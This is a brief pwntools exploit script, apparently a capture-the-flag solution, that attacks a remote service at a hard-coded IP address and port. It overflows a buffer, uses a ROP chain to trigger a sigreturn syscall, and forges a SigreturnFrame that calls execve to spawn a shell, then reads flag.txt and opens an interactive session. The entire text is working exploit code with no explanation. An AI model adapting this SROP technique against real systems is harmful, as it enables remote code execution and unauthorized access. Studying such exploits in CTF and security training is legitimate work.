from pwn import *

context.clear(arch='amd64')

p = remote('193.57.159.27',25388)
#pid= gdb.attach(p,gdbscript='')
pop_rax_ret = 0x000000000040103f
syscall = 0x000000000040102b

payload = ""
payload += 'A'*8
payload += p64(pop_rax_ret)
payload += p64(0xf)
payload += p64(syscall)


frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b
frame.rsi = 0x0
frame.rdi = 0x402000
frame.rdx = 0
frame.rsp = 0x402500
frame.rip = syscall

payload += str(frame)

p.send(payload)
p.send('cat flag.txt')
p.interactive()
